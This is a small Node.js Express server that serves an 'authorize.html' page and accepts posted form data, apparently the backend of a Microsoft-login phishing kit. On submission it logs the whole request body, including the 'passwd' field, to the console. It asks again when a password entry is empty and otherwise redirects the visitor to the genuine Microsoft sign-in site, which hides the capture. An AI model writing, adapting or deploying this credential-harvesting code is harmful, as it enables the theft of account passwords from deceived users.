var express = require('express')
var bodyParser = require('body-parser')
var path = require('path');
var fs = require('fs')
var app = express()

app.use(bodyParser())

app.use(express.static(__dirname))

app.get('/', function(request, response) {
  console.log('GET /')
  
  response.sendFile(path.join(__dirname + '/authorize.html'));
})

app.post('/', function(request, response) {
  console.log('POST /')
  console.dir(request.body)
  if(request.body['passwd'][1] == '') {
      response.redirect("?getpass=true")
  } else {
      response.redirect("https://login.microsoftonline.com/")
  }
})

port = 3000
app.listen(port)
console.log(`Listening at http://localhost:${port}`)